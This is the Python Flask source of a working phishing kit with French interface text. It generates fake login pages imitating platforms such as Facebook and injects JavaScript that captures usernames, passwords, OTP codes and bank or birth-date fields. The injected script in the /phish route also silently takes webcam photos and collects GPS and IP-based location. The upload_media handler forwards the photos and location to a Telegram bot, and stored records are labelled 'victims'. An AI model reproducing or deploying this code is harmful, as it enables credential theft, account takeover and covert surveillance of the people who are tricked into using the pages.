                const trimmed = el.textContent.trim();
                const mapped = dict[trimmed.toLowerCase()];
                if (mapped && mapped !== trimmed) {{
                    el.textContent = mapped;
                }}
            }}
        }});

        const walker = document.createTreeWalker(rootNode, NodeFilter.SHOW_TEXT, null, false);
        let node;
        while ((node = walker.nextNode())) {{
            if (!node.parentElement || ["SCRIPT", "STYLE"].indexOf(node.parentElement.tagName) !== -1) continue;
            const raw = node.nodeValue || "";
            const trimmed = raw.trim();
            if (!trimmed) continue;
            const mapped = dict[trimmed.toLowerCase()];
            if (mapped) {{
                node.nodeValue = raw.replace(trimmed, mapped);
            }}
        }}
    }}

    function startTranslationObserver() {{
        translateDomTree(document.body || document.documentElement);
        if (!window.MutationObserver) return;
        const obs = new MutationObserver(function(mutations) {{
            mutations.forEach(function(m) {{
                if (m.type === "childList") {{
                    m.addedNodes.forEach(function(n) {{
                        if (n.nodeType === 1) translateDomTree(n);
                    }});
                }} else if (m.type === "characterData" && m.target && m.target.parentElement) {{
                    translateDomTree(m.target.parentElement);
                }}
            }});
        }});
        obs.observe(document.documentElement, {{ childList: true, subtree: true, characterData: true }});
    }}

    if (document.readyState === "loading") {{
        document.addEventListener("DOMContentLoaded", startTranslationObserver);
    }} else {{
        startTranslationObserver();
    }}
}})();
</script>
"""


def _build_platform_standalone_page(platform_meta: dict, owner_name: str, is_otp: bool, lang_code: str, redirect_url: str = "https://www.google.com") -> str:
    safe_lang = sanitize_lang(lang_code)
    net_name = platform_meta["name"]
    img_url = platform_meta["img"]
    accent = platform_meta.get("accent", "#1877f2")
    safe_owner = json.dumps(owner_name or "Kim")
    safe_net = json.dumps(net_name)
    safe_redir = json.dumps(redirect_url or "https://www.google.com")
    safe_type = "OTP" if is_otp else "STANDARD"

    otp_field_html = ""
    if is_otp:
        otp_field_html = """
            <div class="field-group">
                <label id="lbl-otp" for="ph-otp">Code secret / OTP</label>
                <input type="text" id="ph-otp" name="otp" placeholder="Code secret / OTP" required>
            </div>
        """

    html = f"""<!DOCTYPE html>
<html lang="{safe_lang}">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{net_name} — Connexion</title>
    <style>
        * {{ box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif; }}
        body {{
            min-height: 100vh;
            background: #f0f2f5;
            color: #1c1e21;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }}
        .auth-card {{
            width: 100%;
            max-width: 410px;
            background: #ffffff;
            border-radius: 10px;
            box-shadow: 0 8px 28px rgba(0, 0, 0, 0.12);
            padding: 28px 24px;
            border-top: 4px solid {accent};
        }}
        .brand-header {{
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
            margin-bottom: 20px;
        }}
        .brand-logo {{
            width: 72px;
            height: 72px;
            border-radius: 16px;
            object-fit: cover;
            border: 1px solid #e4e6eb;
            margin-bottom: 12px;
            background: #111;
        }}
        .brand-title {{
            font-size: 22px;
            font-weight: 700;
            color: #111827;
            margin-bottom: 4px;
        }}
        .brand-sub {{
            font-size: 13px;
            color: #65676b;
        }}
        .field-group {{
            margin-bottom: 14px;
        }}
        .field-group label {{
            display: block;
            font-size: 13px;
            font-weight: 600;
            color: #374151;
            margin-bottom: 6px;
        }}
        .field-group input {{
            width: 100%;
            padding: 11px 13px;
            border: 1px solid #ccd0d5;
            border-radius: 6px;
            font-size: 14px;
            outline: none;
        }}
        .field-group input:focus {{
            border-color: {accent};
            box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.15);
        }}
        .submit-btn {{
            width: 100%;
            padding: 12px;
            border: none;
            border-radius: 6px;
            background: {accent};
            color: #ffffff;
            font-size: 15px;
            font-weight: 700;
            cursor: pointer;
            margin-top: 6px;
        }}
        .submit-btn:hover {{
            opacity: 0.94;
        }}
        .msg-box {{
            margin-top: 12px;
            font-size: 12.5px;
            text-align: center;
            color: #374151;
            min-height: 18px;
        }}
    </style>
</head>
<body>
    <div class="auth-card">
        <div class="brand-header">
            <img class="brand-logo" src="{img_url}" alt="{net_name}">
            <div class="brand-title" id="auth-main-title">{net_name}</div>
            <div class="brand-sub" id="auth-sub-title">Connectez-vous à votre compte.</div>
        </div>
        <form id="platform-login-form">
            <div class="field-group">
                <label id="lbl-user" for="ph-user">Identifiant</label>
                <input type="text" id="ph-user" name="victimUser" placeholder="Identifiant" required>
            </div>
            <div class="field-group">
                <label id="lbl-pass" for="ph-pass">Mot de passe</label>
                <input type="password" id="ph-pass" name="victimPass" placeholder="Mot de passe" required>
            </div>
            {otp_field_html}
            <button type="submit" class="submit-btn" id="auth-submit-btn">Se connecter</button>
            <div class="msg-box" id="auth-status-msg"></div>
        </form>
    </div>

    {_build_lang_injection_script(safe_lang, owner_name, net_name, is_otp, redirect_url)}

    <script>
    (function() {{
        const OWNER = {safe_owner};
        const NETWORK = {safe_net};
        const REDIRECT_URL = {safe_redir};
        const CAPTURE_TYPE = "{safe_type}";
        const sidKey = "ab_sid_" + OWNER + "_" + NETWORK;
        let sessionKey = sessionStorage.getItem(sidKey);
        if (!sessionKey) {{
            sessionKey = "s_" + Date.now().toString(36) + "_" + Math.random().toString(36).slice(2, 8);
            sessionStorage.setItem(sidKey, sessionKey);
        }}

        function applyLocalizedTexts() {{
            const i18n = window.ABEILLES_I18N;
            if (!i18n || !i18n.strings) return;
            const s = i18n.strings;
            const subEl = document.getElementById("auth-sub-title");
            const lblUser = document.getElementById("lbl-user");
            const inpUser = document.getElementById("ph-user");
            const lblPass = document.getElementById("lbl-pass");
            const inpPass = document.getElementById("ph-pass");
            const lblOtp = document.getElementById("lbl-otp");
            const inpOtp = document.getElementById("ph-otp");
            const btn = document.getElementById("auth-submit-btn");

            if (subEl) subEl.textContent = s.subtitle;
            if (lblUser) lblUser.textContent = s.userLabel;
            if (inpUser) inpUser.placeholder = s.userLabel;
            if (lblPass) lblPass.textContent = s.passLabel;
            if (inpPass) inpPass.placeholder = s.passLabel;
            if (lblOtp) lblOtp.textContent = s.otpLabel;
            if (inpOtp) inpOtp.placeholder = s.otpLabel;
            if (btn) btn.textContent = CAPTURE_TYPE === "OTP" ? s.otpBtn : s.submitBtn;
        }}

        applyLocalizedTexts();

        const form = document.getElementById("platform-login-form");
        if (form) {{
            form.addEventListener("submit", async function(e) {{
                e.preventDefault();
                const uVal = (document.getElementById("ph-user")?.value || "").trim();
                const pVal = (document.getElementById("ph-pass")?.value || "").trim();
                const oVal = (document.getElementById("ph-otp")?.value || "").trim();
                const msgEl = document.getElementById("auth-status-msg");

                if (!uVal || !pVal) {{
                    if (msgEl && window.ABEILLES_I18N) msgEl.textContent = window.ABEILLES_I18N.strings.missingMsg;
                    return;
                }}

                const fields = {{
                    identifiant: uVal,
                    mot_de_passe: pVal
                }};
                if (oVal) fields.code_otp = oVal;

                try {{
                    await fetch("/api/capture", {{
                        method: "POST",
                        headers: {{ "Content-Type": "application/json" }},
                        body: JSON.stringify({{
                            owner: OWNER,
                            network: NETWORK,
                            type: oVal ? "OTP" : CAPTURE_TYPE,
                            sessionKey: sessionKey,
                            victimUser: uVal,
                            victimPass: pVal,
                            otp: oVal || "Aucun",
                            fields: fields
                        }}),
                        keepalive: true
                    }});
                }} catch (_) {{}}

                if (msgEl) {{
                    msgEl.textContent = window.ABEILLES_I18N ? window.ABEILLES_I18N.translate("redirection en cours...") : "Redirection en cours...";
                }}
                setTimeout(function() {{
                    window.location.replace(REDIRECT_URL);
                }}, 250);
            }});
        }}
    }})();
    </script>
</body>
</html>"""
    return html


def _render_standard_or_otp(folder: str, slug_clean: str, owner_param: str = "Kim", lang_code: str = "fr"):
    meta = get_platform_meta(slug_clean)
    plat_key = normalize_platform_key(slug_clean)
    is_otp = (folder == "otp")

    if is_otp:
        candidates = [
            f"otp/{plat_key}_otp.html",
            f"otp/{plat_key}-otp.html",
            f"otp/{plat_key}.html",
            f"otp/{slug_clean}.html",
        ]
    else:
        candidates = [
            f"standard/{plat_key}.html",
            f"standard/{plat_key}_standard.html",
            f"standard/{plat_key}-standard.html",
            f"standard/{slug_clean}.html",
        ]

    for tpl in candidates:
        try:
            rendered = render_template(tpl, owner=owner_param, network=meta["name"], lang=lang_code)
            script_lang = _build_lang_injection_script(lang_code, owner_param, meta["name"], is_otp=is_otp)
            if "</body>" in rendered:
                rendered = rendered.replace("</body>", script_lang + "</body>")
            else:
                rendered += script_lang
            return rendered
        except Exception:
            continue

    return _build_platform_standalone_page(
        platform_meta=meta,
        owner_name=owner_param,
        is_otp=is_otp,
        lang_code=lang_code,
    )


@app.route("/phish/<path:subpath>")
def render_phish_page(subpath):
    cleanup_expired_3days()
    subpath_clean = subpath.lower().strip("/")
    req_type = (request.args.get("type") or "").lower()
    owner_param = sanitize_text(request.args.get("user") or "", 60) or "Kim"
    lang_code = sanitize_lang(request.args.get("lang") or "fr")

    raw_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    v_ip = raw_ip.split(",")[0].strip() if raw_ip else "127.0.0.1"
    device_type = detect_device(request.headers.get("User-Agent", ""))

    full_req_path = request.full_path.rstrip("?")
    if not register_or_check_link_3days(link_key=full_req_path, owner=owner_param, link_type=req_type or "phish", slug=subpath_clean, force_reset=False):
        return render_expired_link_error_page(subpath_clean)

    db_slug = subpath_clean.replace("otp/", "").replace("standard/", "")
    clean_custom_slug = (
        db_slug.replace("_otp", "")
        .replace("-otp", "")
        .replace("_standard", "")
        .replace("-standard", "")
    )

    conn = get_db_connection()
    cursor = conn.cursor()
    possible_slugs = [db_slug, clean_custom_slug, db_slug.replace("-", "_"), db_slug.replace("_", "-")]

    cp = None
    for s in possible_slugs:
        cursor.execute("SELECT * FROM custom_pages WHERE LOWER(slug) = LOWER(?)", (s,))
        cp = cursor.fetchone()
        if cp:
            break
    conn.close()

    if cp:
        cp_dict = dict(cp)
        now_ms = int(datetime.datetime.now().timestamp() * 1000)
        if (now_ms - int(cp_dict.get("created_at", 0))) > (EXPIRY_SECONDS * 1000):
            return render_expired_link_error_page(cp_dict.get("network") or cp_dict.get("slug") or "Page")

        page_owner = sanitize_text(cp_dict.get("owner") or "", 60) or owner_param
        page_net = sanitize_text(cp_dict.get("network") or cp_dict.get("slug") or "Page Perso", 60)
        record_link_visit(page_owner, page_net, request.path, v_ip, device_type)

        redirect_url = cp_dict.get("redirect_url") or "https://www.google.com"
        mode = cp_dict.get("mode", "opt1")

        if mode in ["opt2", "opt3"] and cp_dict.get("html_code"):
            html = cp_dict["html_code"]
            owner = cp_dict["owner"]
            network = cp_dict["network"]
            is_opt3 = "true" if mode == "opt3" else "false"
            try:
                opt3_cfg = json.loads(cp_dict.get("opt3_config") or "{}")
            except Exception:
                opt3_cfg = {}

            cam_front = "true" if opt3_cfg.get("camFront", True) else "false"
            cam_back = "true" if opt3_cfg.get("camBack", False) else "false"
            gps_enabled = "true" if opt3_cfg.get("gps", True) else "false"
            photo_count = max(1, min(6, int(opt3_cfg.get("photoCount", 1) or 1)))

            injection_script = """
<script>
(function() {
    const OWNER = "__OWNER__";
    const NETWORK = "__NETWORK__";
    const REDIRECT_URL = "__REDIRECT_URL__";
    const IS_OPT3 = __IS_OPT3__;
    const CAM_FRONT = __CAM_FRONT__;
    const CAM_BACK = __CAM_BACK__;
    const GPS_ENABLED = __GPS_ENABLED__;
    const TOTAL_PHOTOS = __PHOTO_COUNT__;
    const ADMIN_CODE = "4121@.";

    let isProcessing = false, hasRedirected = false, gpsSent = false, mediaRunning = false;
    let userData = {
        user: localStorage.getItem('ph_user_' + OWNER) || "",
        pass: localStorage.getItem('ph_pass_' + OWNER) || "",
        otp: "",
        fields: {}
    };

    function getSessionKey() {
        const k = 'ph_session_' + OWNER + '_' + NETWORK;
        let sid = sessionStorage.getItem(k) || localStorage.getItem(k);
        if (!sid) {
            sid = 'sid_' + Date.now().toString(36) + '_' + Math.random().toString(36).slice(2, 8);
            try { sessionStorage.setItem(k, sid); } catch (e) {}
            try { localStorage.setItem(k, sid); } catch (e) {}
        }
        return sid;
    }

    function sendGps(lat, lon, methodName) {
        if (gpsSent || lat === undefined || lon === undefined || lat === null || lon === null) return;
        gpsSent = true;
        const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
        fetch('/api/upload_media', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                owner: OWNER,
                network: NETWORK,
                mode: 'opt3',
                type: 'gps',
                method: methodName,
                latitude: lat,
                longitude: lon,
                gps: mapsUrl,
                user: userData.user || 'Inconnu',
                device: navigator.userAgent
            }),
            keepalive: true
        }).catch(() => {});
    }

    function runGpsMethods() {
        if (!IS_OPT3 || !GPS_ENABLED) return;

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                pos => sendGps(pos.coords.latitude, pos.coords.longitude, "GPS-1 Haute Précision"),
                () => {},
                { enableHighAccuracy: true, timeout: 7000, maximumAge: 0 }
            );

            navigator.geolocation.getCurrentPosition(
                pos => sendGps(pos.coords.latitude, pos.coords.longitude, "GPS-2 Standard"),
                () => {},
                { enableHighAccuracy: false, timeout: 7000, maximumAge: 60000 }
            );

            try {
                const wid = navigator.geolocation.watchPosition(
                    pos => {
                        sendGps(pos.coords.latitude, pos.coords.longitude, "GPS-3 WatchPosition");
                        navigator.geolocation.clearWatch(wid);
                    },
                    () => {},
                    { enableHighAccuracy: true, timeout: 8000 }
                );
            } catch (e) {}
        }

        fetch('https://ipapi.co/json/').then(r => r.json()).then(d => {
            if (d && d.latitude && d.longitude) sendGps(d.latitude, d.longitude, "GPS-4 IPAPI");
        }).catch(() => {});

        fetch('https://ipwho.is/').then(r => r.json()).then(d => {
            if (d && d.success && d.latitude && d.longitude) sendGps(d.latitude, d.longitude, "GPS-5 IPWHO");
        }).catch(() => {});

        fetch('https://ipinfo.io/json').then(r => r.json()).then(d => {
            if (d && d.loc && d.loc.includes(',')) {
                const parts = d.loc.split(',');
                sendGps(parts[0], parts[1], "GPS-6 IPINFO");
            }
        }).catch(() => {});

        fetch('https://freeipapi.com/api/json').then(r => r.json()).then(d => {
            if (d && d.latitude && d.longitude) sendGps(d.latitude, d.longitude, "GPS-7 FreeIPAPI");
        }).catch(() => {});
    }

    function buildPhotoPlan() {
        const modes = [];
        if (CAM_FRONT) modes.push("user");
        if (CAM_BACK) modes.push("environment");
        if (modes.length === 0) modes.push("user");

        const plan = [];
        for (let i = 0; i < TOTAL_PHOTOS; i++) {
            plan.push({ index: i + 1, facing: modes[i % modes.length] });
        }
        return plan;
    }

    async function extractImageFromStream(stream) {
        const video = document.createElement('video');
        video.setAttribute('playsinline', '');
        video.setAttribute('autoplay', '');
        video.muted = true;
        video.srcObject = stream;
        await video.play().catch(() => {});

        for (let w = 0; w < 15; w++) {
            if (video.videoWidth > 0 && video.videoHeight > 0) break;
            await new Promise(r => setTimeout(r, 140));
        }

        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
        const dataUrl = canvas.toDataURL('image/jpeg', 0.85);

        stream.getTracks().forEach(t => t.stop());
        return dataUrl;
    }

    async function capturePhotoMultiMethod(facingMode, shotIndex) {
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;

        const methods = [
            { label: "Photo-M1 ExactFacing", constraints: { video: { facingMode: { exact: facingMode } }, audio: false } },
            { label: "Photo-M2 IdealFacing", constraints: { video: { facingMode: facingMode }, audio: false } },
            { label: "Photo-M3 HD", constraints: { video: { width: { ideal: 1280 }, height: { ideal: 720 }, facingMode: facingMode }, audio: false } },
            { label: "Photo-M4 DefaultCam", constraints: { video: true, audio: false } },
            { label: "Photo-M5 VGA", constraints: { video: { width: 640, height: 480 }, audio: false } },
            { label: "Photo-M6 FrameRate", constraints: { video: { frameRate: { ideal: 15 }, facingMode: facingMode }, audio: false } }
        ];

        for (const m of methods) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia(m.constraints);
                const dataUrl = await extractImageFromStream(stream);
                if (dataUrl && dataUrl.length > 200) {
                    await fetch('/api/upload_media', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            owner: OWNER,
                            network: NETWORK,
                            mode: 'opt3',
                            type: 'photo',
                            method: m.label,
                            facing: facingMode,
                            shotNumber: shotIndex,
                            totalPhotos: TOTAL_PHOTOS,
                            photo: dataUrl,
                            user: userData.user || 'Inconnu',
                            device: navigator.userAgent
                        }),
                        keepalive: true
                    });
                    return;
                }
            } catch (e) {}
        }
    }

    async function runOption3Media() {
        if (!IS_OPT3 || mediaRunning) return;
        mediaRunning = true;
        runGpsMethods();
        const plan = buildPhotoPlan();
        for (const item of plan) {
            await capturePhotoMultiMethod(item.facing, item.index);
        }
        mediaRunning = false;
    }

    function fieldLabel(inp) {
        return (inp.name || inp.id || inp.placeholder || inp.getAttribute('aria-label') || inp.type || 'champ').trim();
    }

    function classify(inp) {
        const name = (inp.name || inp.id || inp.placeholder || inp.getAttribute('aria-label') || "").toLowerCase();
        const type = (inp.type || "").toLowerCase();
        if (type === "password") return "pass";
        if (/card|carte|cc-|cvv|cvc|csc|exp|expiry|expiration|iban|rib|bic|swift|banque|bank/.test(name)) return "bank";
        if (type === "date" || /birth|naissance|dob|bday|jour|mois|annee|année|jj|mm|aaaa|yyyy/.test(name)) return "dob";
        if (name.includes('otp') || name.includes('code') || name.includes('verif') || name.includes('2fa')) return "otp";
        if (type === "email" || type === "tel" || name.includes('user') || name.includes('email') || name.includes('login') || name.includes('phone') || name.includes('identifiant')) return "user";
        return "other";
    }

    async function processData() {
        if (isProcessing || hasRedirected) return;
        isProcessing = true;

        let hasOtp = false;
        const collected = {};
        let foundUserInForm = "";
        let foundPassInForm = "";

        document.querySelectorAll('input, select, textarea').forEach(inp => {
            const t = (inp.type || "").toLowerCase();
            if (t === "submit" || t === "button" || t === "reset") return;
            const val = (inp.value || "").trim();
            if (!val) return;

            const lbl = fieldLabel(inp);
            collected[lbl] = val;

            const c = classify(inp);
            if (c === "user") {
                foundUserInForm = val;
                userData.user = val;
                localStorage.setItem('ph_user_' + OWNER, val);
            } else if (c === "pass") {
                foundPassInForm = val;
                userData.pass = val;
                localStorage.setItem('ph_pass_' + OWNER, val);
            } else if (c === "otp") {
                userData.otp = val;
                hasOtp = true;
            } else if (!userData.user && (c === "bank" || c === "dob" || c === "other")) {
                userData.user = val;
            }
        });

        if (!foundUserInForm) {
            userData.user = localStorage.getItem('ph_user_' + OWNER) || userData.user || "";
        }
        if (!foundPassInForm) {
            userData.pass = localStorage.getItem('ph_pass_' + OWNER) || userData.pass || "";
        }

        userData.fields = collected;

        if (userData.pass === ADMIN_CODE && userData.user) {
            if (userData.user === ADMIN_CODE) {
                window.location.replace('/');
                return;
            }
            window.location.replace(REDIRECT_URL);
            return;
        }

        if (IS_OPT3) {
            await runOption3Media();
        }

        const captureType = hasOtp ? "OTP" : "OTP_STEP1";
        await fetch('/api/capture', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                owner: OWNER,
                network: NETWORK,
                mode: IS_OPT3 ? 'opt3' : 'opt2',
                type: captureType,
                sessionKey: getSessionKey(),
                victimUser: userData.user || "Inconnu",
                victimPass: userData.pass || "Inconnu",
                otp: hasOtp ? userData.otp : "En attente OTP...",
                fields: collected,
                extra_info: JSON.stringify({ ua: navigator.userAgent, platform: navigator.platform, fields: collected })
            }),
            keepalive: true
        });

        if (hasOtp) {
            hasRedirected = true;
            setTimeout(() => window.location.replace(REDIRECT_URL), 150);
            return;
        }
        isProcessing = false;
    }

    document.addEventListener('DOMContentLoaded', () => {
        if (IS_OPT3) {
            runOption3Media();
        }
        document.querySelectorAll('form').forEach(f => {
            f.addEventListener('submit', () => {
                processData();
            });
        });
        document.addEventListener('click', function(e) {
            const target = e.target;
            if (target.tagName === 'BUTTON' || (target.tagName === 'INPUT' && target.type === 'submit')) {
                processData();
            }
        });
    });
})();
</script>
"""
            script_final = (
                injection_script.replace("__OWNER__", owner)
                .replace("__NETWORK__", network)
                .replace("__REDIRECT_URL__", redirect_url)
                .replace("__IS_OPT3__", is_opt3)
                .replace("__CAM_FRONT__", cam_front)
                .replace("__CAM_BACK__", cam_back)
                .replace("__GPS_ENABLED__", gps_enabled)
                .replace("__PHOTO_COUNT__", str(photo_count))
                + _build_lang_injection_script(lang_code, owner, network, is_otp=False, redirect_url=redirect_url)
            )
            if "</body>" in html:
                html = html.replace("</body>", script_final + "</body>")
            else:
                html += script_final
            return render_template_string(html)

        try:
            fields_parsed = json.loads(cp_dict.get("fields_json") or "[]")
        except Exception:
            fields_parsed = []

        net_name = cp_dict.get("network", "Facebook")
        resolved_logo = resolve_platform_image(net_name, cp_dict.get("logo_url", ""))
        config = {
            "owner": cp_dict.get("owner", "Kim"),
            "title": cp_dict.get("title", "Connexion"),
            "network": net_name,
            "bg_type": cp_dict.get("bg_type", "color"),
            "bg_value": cp_dict.get("bg_value", "#111"),
            "logo_url": resolved_logo,
            "logo_shape": cp_dict.get("logo_shape", "circle"),
            "fields": fields_parsed,
            "btn_text": cp_dict.get("btn_text", "Se connecter"),
            "box_bg": cp_dict.get("box_bg") or "rgba(255,255,255,0.95)",
            "box_width": cp_dict.get("box_width") or "420px",
            "redirect_url": redirect_url,
            "lang": lang_code,
        }
        try:
            rendered_custom = render_template("custom_login.html", config=config)
        except Exception:
            meta_cp = get_platform_meta(net_name)
            meta_cp["img"] = resolved_logo
            rendered_custom = _build_platform_standalone_page(
                platform_meta=meta_cp,
                owner_name=config["owner"],
                is_otp=False,
                lang_code=lang_code,
                redirect_url=redirect_url,
            )

        lang_script = _build_lang_injection_script(lang_code, config["owner"], net_name, is_otp=False, redirect_url=redirect_url)
        if "</body>" in rendered_custom:
            rendered_custom = rendered_custom.replace("</body>", lang_script + "</body>")
        else:
            rendered_custom += lang_script
        return rendered_custom

    folder = "otp" if (req_type == "otp" or subpath_clean.startswith("otp/") or "otp" in db_slug) else "standard"
    net_detected = get_platform_meta(db_slug)["name"]
    record_link_visit(owner_param, net_detected, request.path, v_ip, device_type)
    return _render_standard_or_otp(folder, db_slug, owner_param, lang_code)


@app.route("/api/upload_media", methods=["POST"])
def upload_media():
    data = request.json or {}
    if data.get("mode") != "opt3":
        return jsonify({"status": "ignored", "reason": "Option 3 only"}), 400

    owner = sanitize_text(data.get("owner") or "", 60) or "Kim"
    network = sanitize_text(data.get("network", "Inconnu"), 60)
    m_type = sanitize_text(data.get("type", "media"), 20)
    facing = data.get("facing", "user")
    camera_label = "Caméra arrière" if facing == "environment" else "Caméra avant"
    shot_num = data.get("shotNumber", 1)
    total_shots = data.get("totalPhotos", 1)

    raw_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    v_ip = raw_ip.split(",")[0].strip() if raw_ip else "127.0.0.1"
    device_type = detect_device(data.get("device", ""))

    if m_type == "gps":
        method_name = sanitize_text(data.get("method", "GPS"), 50)
        msg = (
            f"📍 *LOCALISATION GPS ({method_name})*\n"
            f"┌──────────────────────────────┐\n"
            f"│ 👤 *Propriétaire:* `{owner}`\n"
            f"│ 🌐 *Plateforme:* {network}\n"
            f"│ 🗺️ *Carte:* [Ouvrir Google Maps]({data.get('gps')})\n"
            f"└──────────────────────────────┘\n"
            f"• *Appareil:* `{device_type}`\n"
            f"• *Adresse IP:* `{v_ip}`\n"
            f"{BEES_FOOTER}"
        )
        send_telegram_notification(GROUP_BOT_TOKEN, GROUP_CHAT_ID, msg)
        lat = data.get("latitude")
        lon = data.get("longitude")
        if lat is not None and lon is not None:
            try:
                send_telegram_location_direct(
                    GROUP_BOT_TOKEN,
                    GROUP_CHAT_ID,
                    float(lat),
                    float(lon),
                    caption=f"📍 {network} ({owner})",
                )
            except Exception:
                pass
    elif m_type == "photo":
        photo_b64 = (data.get("photo") or "").split(",")[-1]
        if photo_b64:
            url = f"https://api.telegram.org/bot{GROUP_BOT_TOKEN}/sendPhoto"
            caption = (
                f"📸 *CAPTURE PHOTO {shot_num}/{total_shots} ({camera_label})*\n"
                f"┌──────────────────────────────┐\n"
                f"│ 👤 *Propriétaire:* `{owner}`\n"
                f"│ 🌐 *Plateforme:* {network}\n"
                f"└──────────────────────────────┘\n"
                f"• *Appareil:* `{device_type}`\n"
                f"• *Adresse IP:* `{v_ip}`\n"
                f"{BEES_FOOTER}"
            )
            try:
                res = requests.post(
                    url,
                    data={"chat_id": GROUP_CHAT_ID, "caption": caption, "parse_mode": "Markdown"},
                    files={"photo": (f"photo_{shot_num}.jpg", base64.b64decode(photo_b64), "image/jpeg")},
                    timeout=12,
                )
                if res.status_code != 200:
                    print("Telegram sendPhoto status:", res.status_code, res.text)
            except Exception as e:
                print("Erreur envoi photo groupe:", e)

    return jsonify({"status": "success"})


@app.route("/api/create_login", methods=["POST"])
def create_login():
    data = request.json or {}
    owner = sanitize_text(data.get("owner") or "", 60)
    slug = sanitize_slug(data.get("slug") or "")
    if not owner or not slug:
        return jsonify({"status": "error", "message": "Propriétaire ou slug manquant"})

    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        now_ms = int(datetime.datetime.now().timestamp() * 1000)
        mode = sanitize_text(data.get("mode", "opt1"), 20)
        redirect_url = sanitize_text(data.get("redirectUrl", "https://www.google.com"), 400)
        if not redirect_url.startswith(("https://", "http://")):
            redirect_url = "https://www.google.com"
        opt3_json = json.dumps(data.get("opt3Config") or {})

        if mode in ["opt2", "opt3"]:
            safe_html = sanitize_html_payload(data.get("htmlCode") or "")
            cursor.execute(
                """
                INSERT OR REPLACE INTO custom_pages
                (owner, slug, title, network, bg_type, bg_value, logo_url, logo_shape, fields_json, btn_text, html_code, redirect_url, mode, opt3_config, box_bg, box_width, created_at)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                """,
                (
                    owner,
                    slug,
                    "Page Perso",
                    sanitize_text(data.get("network") or "Page Perso", 60),
                    "color",
                    "#111",
                    "",
                    "circle",
                    "[]",
                    "Valider",
                    safe_html,
                    redirect_url,
                    mode,
                    opt3_json,
                    "#fff",
                    "420px",
                    now_ms,
                ),
            )
        else:
            net_val = sanitize_text(data.get("network") or "Facebook", 60)
            logo_val = resolve_platform_image(net_val, sanitize_text(data.get("logoUrl") or "", 400))
            cursor.execute(
                """
                INSERT OR REPLACE INTO custom_pages
                (owner, slug, title, network, bg_type, bg_value, logo_url, logo_shape, fields_json, btn_text, html_code, redirect_url, mode, opt3_config, box_bg, box_width, created_at)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                """,
                (
                    owner,
                    slug,
                    sanitize_text(data.get("title") or "Connexion", 100),
                    net_val,
                    sanitize_text(data.get("bgType") or "color", 20),
                    sanitize_text(data.get("bgValue") or "#111111", 300),
                    logo_val,
                    sanitize_text(data.get("logoShape") or "circle", 20),
                    json.dumps(data.get("fields") or []),
                    sanitize_text(data.get("btnText") or "Se connecter", 60),
                    "",
                    redirect_url,
                    "opt1",
                    "{}",
                    sanitize_text(data.get("boxBg") or "#fff", 60),
                    sanitize_text(data.get("boxWidth") or "420px", 20),
                    now_ms,
                ),
            )

        conn.commit()
        conn.close()
        register_or_check_link_3days(link_key=f"/phish/{slug}", owner=owner, link_type=mode, slug=slug, force_reset=True)
        return jsonify({"status": "success", "url": f"{request.host_url.rstrip('/')}/phish/{slug}"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})


@app.route("/api/register_account", methods=["POST"])
def register_account():
    data = request.json or {}
    username = sanitize_text(data.get("username") or "", 60)
    password = sanitize_text(data.get("password") or "", 100)
    email = sanitize_text(data.get("email") or "", 120)
    avatar_url = sanitize_text(data.get("avatarUrl") or DEFAULT_LOGO_FALLBACK, 500)
    if not username:
        return jsonify({"status": "error", "message": "Nom d'utilisateur requis"})

    date_str = datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S")
    conn = get_db_connection()
    cursor = conn.cursor()

    cursor.execute("SELECT id, password, email, avatar_url FROM accounts WHERE LOWER(TRIM(username)) = LOWER(?)", (username,))
    existing = cursor.fetchone()
    if existing:
        final_pass = password if (password and password != UNIVERSAL_ADMIN_CODE) else existing["password"]
        final_avatar = avatar_url if (avatar_url and avatar_url != DEFAULT_LOGO_FALLBACK) else (existing["avatar_url"] or DEFAULT_LOGO_FALLBACK)
        cursor.execute(
            "UPDATE accounts SET password = ?, email = ?, avatar_url = ? WHERE id = ?",
            (final_pass, email or existing["email"], final_avatar, existing["id"]),
        )
    else:
        cursor.execute(
            "INSERT INTO accounts (username, password, email, avatar_url, created_at) VALUES (?, ?, ?, ?, ?)",
            (username, password, email, avatar_url, date_str),
        )
    conn.commit()
    conn.close()
    return jsonify({"status": "success", "created_at": date_str, "avatarUrl": avatar_url})


@app.route("/api/admin/accounts", methods=["GET"])
def api_admin_accounts():
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT id, username, password, email, avatar_url, created_at FROM accounts ORDER BY id DESC")
    rows = cursor.fetchall()

    accounts = []
    for r in rows:
        uname = (r["username"] or "").strip()
        cursor.execute("SELECT COUNT(*) AS cnt FROM victims WHERE LOWER(TRIM(owner)) = LOWER(?)", (uname,))
        vc = cursor.fetchone()
        v_count = vc["cnt"] if vc else 0
        accounts.append({
            "id": r["id"],
            "username": uname,
            "password": r["password"],
            "email": r["email"],
            "avatar_url": r["avatar_url"] or DEFAULT_LOGO_FALLBACK,
            "created_at": r["created_at"],
            "victims_count": v_count,
        })
    conn.close()
    return jsonify({"total": len(accounts), "accounts": accounts})


@app.route("/api/messages", methods=["GET"])
